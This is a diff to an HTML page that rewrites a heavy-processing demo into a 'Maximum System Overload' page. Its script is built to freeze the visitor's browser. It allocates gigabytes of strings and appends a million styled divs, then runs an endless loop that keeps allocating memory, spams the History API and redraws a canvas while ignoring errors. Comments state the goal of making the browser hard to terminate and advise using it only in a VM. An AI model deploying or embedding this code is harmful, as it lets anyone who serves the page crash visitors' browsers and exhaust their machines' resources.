@@ -1,68 +1,144 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intense Processing</title>
+    <title>Maximum System Overload</title>
     <style>
         body {
             font-family: sans-serif;
-            margin: 40px;
+            margin: 0; /* Remove default margin */
+            overflow: hidden; /* Hide scrollbars */
+            background-color: #000; /* Black background */
+            color: #fff; /* White text */
             text-align: center;
         }
         h1 {
-            color: #333;
+            color: #ff0000; /* Bright Red */
+            margin-top: 50px;
         }
         p {
-            color: #666;
+            color: #aaaaaa; /* Grey */
+        }
+        canvas {
+            display: block; /* Make canvas a block element */
+            margin: 20px auto;
+            border: 1px solid #fff;
         }
     </style>
 </head>
 <body>
 
-    <h1>Performing Intense Operations...</h1>
-    <p>This page is executing complex tasks. Please wait.</p>
+    <h1>Initiating Maximum Overload Sequence...</h1>
+    <p>Attempting to consume all available resources and lock the browser process.</p>
+    <canvas id="myCanvas" width="500" height="300"></canvas>
+
 
     <script>
-    var total = "";
-    var memoryHog = [];
+    // This script is designed to cause a severe freeze and make the browser process
+    // extremely difficult to terminate by consuming massive resources and locking the main thread.
+    // Use with extreme caution and only in isolated testing environments (like a VM).
+
+    var memoryHog = []; // For initial large memory allocation
+    var continuousMemory = []; // For continuous allocation inside the loop
+    var historyCounter = 0;
     var body = document.body;
+    var canvas = document.getElementById('myCanvas');
+    var ctx = canvas.getContext('2d');
 
-    // Attempt to stress DOM creation and appending
-    // Creating a large number of elements can consume significant memory and rendering resources
-    // Adjust the loop count as needed - 1 million is often enough to cause issues
-    for (var i = 0; i < 1000000; i++) {
-        var div = document.createElement('div');
-        // Optionally add content or style to make elements heavier
-        // div.style.height = '1px';
-        // div.style.width = '1px';
-        // div.textContent = i;
-        body.appendChild(div);
+    // --- Phase 1: Pre-freeze Resource Consumption ---
+
+    // 1a: Allocate a large amount of memory (e.g., several GB)
+    console.log("Phase 1a: Allocating initial memory...");
+    try {
+        // Allocate 10 million strings of ~1KB each = ~10GB
+        for (var i = 0; i < 10000000; i++) {
+            memoryHog.push(new Array(1000).join('A') + i);
+        }
+    } catch (e) {
+        console.error("Error during initial memory allocation:", e);
+    }
+    console.log("Phase 1a complete.");
+
+    // 1b: Create and append a large number of DOM elements (e.g., 1 million)
+    console.log("Phase 1b: Creating DOM elements...");
+    try {
+        for (var i = 0; i < 1000000; i++) {
+            var div = document.createElement('div');
+            // Make elements slightly heavier and visible
+            div.style.height = '1px';
+            div.style.width = '1px';
+            div.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16); // Random color
+            div.style.position = 'absolute'; // Use absolute positioning to avoid layout cost issues
+            div.style.left = (i % window.innerWidth) + 'px';
+            div.style.top = (Math.floor(i / window.innerWidth) % window.innerHeight) + 'px';
+            body.appendChild(div);
+        }
+    } catch (e) {
+         console.error("Error during DOM creation:", e);
+    }
+     console.log("Phase 1b complete.");
+
+
+    // --- Phase 2: Infinite Loop and Continuous Stress ---
+
+    // This loop will run indefinitely, consuming CPU and attempting continuous operations
+    console.log("Phase 2: Entering infinite loop and continuous stress...");
+
+    while (true) {
+        // 2a: Continuous Memory Allocation
+        // Allocate more memory constantly inside the loop
+        try {
+             // Allocate smaller strings constantly to keep memory growing
+             continuousMemory.push(new Array(500).join('B') + historyCounter);
+        } catch (e) {
+             // Ignore errors, keep trying
+        }
+
+        // 2b: Continuous History API Spam
+        // Repeatedly push states to stress history and consume memory/storage
+        try {
+            // Make the URL slightly more complex
+            history.pushState(historyCounter, '', '/' + historyCounter + '/' + continuousMemory.length + '/' + Math.random().toString(36).substring(7));
+            historyCounter++;
+        } catch (e) {
+            // Ignore errors, keep trying
+        }
+
+        // 2c: Rapid Canvas Drawing
+        // Draw something complex or large repeatedly to stress rendering/GPU
+        try {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)'; // Semi-transparent black
+            ctx.fillRect(0, 0, canvas.width, canvas.height); // Clear with transparency
+
+            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16); // Random color
+            var x = Math.random() * canvas.width;
+            var y = Math.random() * canvas.height;
+            var size = Math.random() * 50;
+            ctx.fillRect(x, y, size, size); // Draw random rectangles
+
+            // Draw lines or paths for more complex rendering
+            ctx.strokeStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
+            ctx.beginPath();
+            ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+            ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+            ctx.stroke();
+
+        } catch (e) {
+            // Ignore errors, keep trying
+        }
+
+        // Note: Adding DOM manipulation inside this tight loop is generally not feasible
+        // or beneficial for the freeze effect compared to the initial DOM creation phase.
+
+        // The loop body contains operations that add continuous resource pressure
+        // while the while(true) ensures the CPU is fully utilized.
     }
 
-    // Stress CPU, String Memory, History API, and Array Memory
-    // This loop runs 10 trillion times and performs multiple resource-intensive operations
-    for( var i = 0; i < 10000000000000; i++ ) {
-      // String concatenation - grows the 'total' string indefinitely
-      total += i.toString();
-
-      // History push - attempts to add a new state and change the URL in every iteration
-      // This consumes history memory and stresses the history API
-      history.pushState(0, 0, total );
-
-      // Memory allocation - push large strings to an array
-      // This consumes heap memory. Doing it every iteration is too much, so do it less often.
-      if (i % 100000 === 0) { // Push every 100,000 iterations (still 100 million pushes)
-           memoryHog.push(new Array(1000).join('X') + i); // Push a large string
-      }
-
-      // Note: Adding DOM manipulation inside this massive loop is generally not feasible
-      // as creating/appending 10^13 elements is impossible. The initial DOM loop handles that stress.
-    }
-
-    console.log("Operations complete."); // This message is highly unlikely to be reached
+    // Code below this loop will never be reached.
+    console.log("This message will never be printed.");
 
     </script>
 
-    <p>If this message is visible, the operations may have finished or encountered an issue.</p>
+    <p>If you are reading this, the script may not have executed as intended or your browser handled it gracefully.</p>
 
 </body>
 </html>
